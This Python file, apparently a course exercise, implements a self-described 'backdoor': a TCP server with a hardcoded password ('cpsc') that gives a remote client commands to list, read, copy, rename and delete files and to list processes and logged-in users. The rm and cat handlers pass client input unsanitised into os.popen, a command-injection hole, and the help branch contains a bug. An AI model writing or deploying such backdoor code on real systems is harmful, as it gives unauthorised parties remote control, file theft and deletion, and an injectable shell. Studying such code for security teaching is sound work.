import socketserver
import socket
import sys, os, shutil
class MyTCPHandler(socketserver.BaseRequestHandler):
# wassap test comment    
   
   BUFFER_SIZE = 4096
   def handle(self):

       descriptions = {}
       descriptions["pwd"] = 'pwd - return the current working directory'
       descriptions["cd"] = 'cd <dir> - change the current working directory to <dir>'
       descriptions["ls"] = 'ls - list the contents of the current working directory'
       descriptions["cp"] = 'cp <file1> <file2> - copy file1 to file2'
       descriptions["mv"] = 'mv <file1> <file2> - rename file1 to file2'
       descriptions["rm"] = 'rm <file> - delete file'
       descriptions["cat"] = 'cat <file> - return contents of the file'
       descriptions["snap"] = 'snap - take a snapshot of all the files in the current directory and save it in memory'
       descriptions["diff"] = 'diff - compare the contents of the current directory to the saved snapshot, and report differences (deleted files, new files and changed files)'
       descriptions["help"] = 'help [cmd] - print a list of commands, and if given an argument, print more detailed help for the command'
       descriptions["logout"] = 'logout - disconnect client'
       descriptions["off"] = 'off - terminate the backdoor program'
       descriptions["ps"] = 'show currently running processes'
       descriptions["who"] = 'list user[s] currently logged in'

       password = "cpsc"

       intro = self.request.sendall(bytearray("Identify yourself!\n", "utf-8"))
       
       passed = False;

       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break
           if len(data) == 0:
               break
           data = data.decode( "utf-8")

           if (passed == False):      # compare user entered password and the actual password
               if (data.split(None, 2)[0] == password):                           
                   self.request.sendall(bytearray("welcome boss\n", "utf-8"))
                   passed = True
                   continue
               else:
                    self.request.sendall(bytearray("bad password\n", "utf-8"))
                          
           # start commands here
           if passed == True:
               
               # pwd
               if data.strip() == "pwd":
                   self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8")) 
                   continue
               
               # cd <dir>
               if data.split(None, 1)[0] == "cd":
                   try:
                      self.request.sendall(bytearray("going to " + data.split(None,2)[1] + "\n", "utf-8"))
                      os.chdir(data.split(None, 2)[1])
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
               
               # ls
               if data.strip() == "ls":
                  for files in os.listdir(os.getcwd()):
                      self.request.sendall(bytearray(files + "\n", "utf-8"))
                  continue
               
               # cp <file1> <file2>
               if data.split(None, 1)[0] == "cp":
                   file1 = data.split(None, 2)[1]
                   file2 = data.split(None, 3)[2]
                   try:
                       shutil.copyfile(file1, file2)
                       self.request.sendall(bytearray("OK\n", "utf-8"))
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
               
               # mv <file1> <file2>
               if data.split(None, 1)[0] == "mv":
                   file1 = data.split(None, 2)[1]
                   file2 = data.split(None, 3)[2]
                   try:
                      os.rename(file1, file2)
                      self.request.sendall(bytearray("OK\n", "utf-8")) 
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
                
                # rm <file>
               if data.split(None, 1)[0] == "rm":
                 filename = data.split(None, 2)[1]
                 try:
                   command = os.popen("rm " + filename)
                   self.request.sendall(bytearray("OK\n", "utf-8")) 
                 except:
                   self.request.sendall(bytearray("bad request\n", "utf-8"))
                 continue

                # cat <file>
               if data.split(None, 1)[0] == "cat":
                  catfile = data.split(None, 2)[1]              #get the name of the cat file
                  command = os.popen("cat " + catfile)          #execute cat command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                  continue
                

                # help [cmd]
               if data.split(None, 1)[0] == "help":
                  command = data.strip("help ")
                  if command == '':
                    self.request.sendall(bytearray("supported commands:\n", "utf-8"))
                    for cmd in descriptions.keys():
                      self.request.sendall(bytearray(cmd + "\n", "utf-8"))

                  
                  else:
                    self.request.sendall(bytearray(descriptions.get(command)), "utf-8")
                  continue

                #ps                
               if data.strip() == "ps":
                  command = os.popen("ps")                      #execute ps command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                  continue

                #who
               if data.strip() == "who":
                  command = os.popen("who")          #execute cat command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  continue


                  
               
                 

                # off
               if data.split(None, 1)[0] == "off":
                  print("Terminating myself...")
                  self.request.sendall(bytearray("Terminating myself...So long\n", "utf-8"))
                  os._exit(1)                                                       #exit without ptinting traceback
                
                

                  
               ######                     #####
               #                              #
               #    ADD MORE COMMANDS HERE!   #
               #                              #
               ######                     #####
               # end of all commands, everything else don't understand
               else:
                   self.request.sendall(bytearray("Sorry don't understand your request\n", "utf-8"))
           

if __name__ == "__main__":
   HOST, PORT = "localhost", int(sys.argv[1])
   server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
   print("backdoor listening on port ", PORT)
   server.serve_forever()
  
   
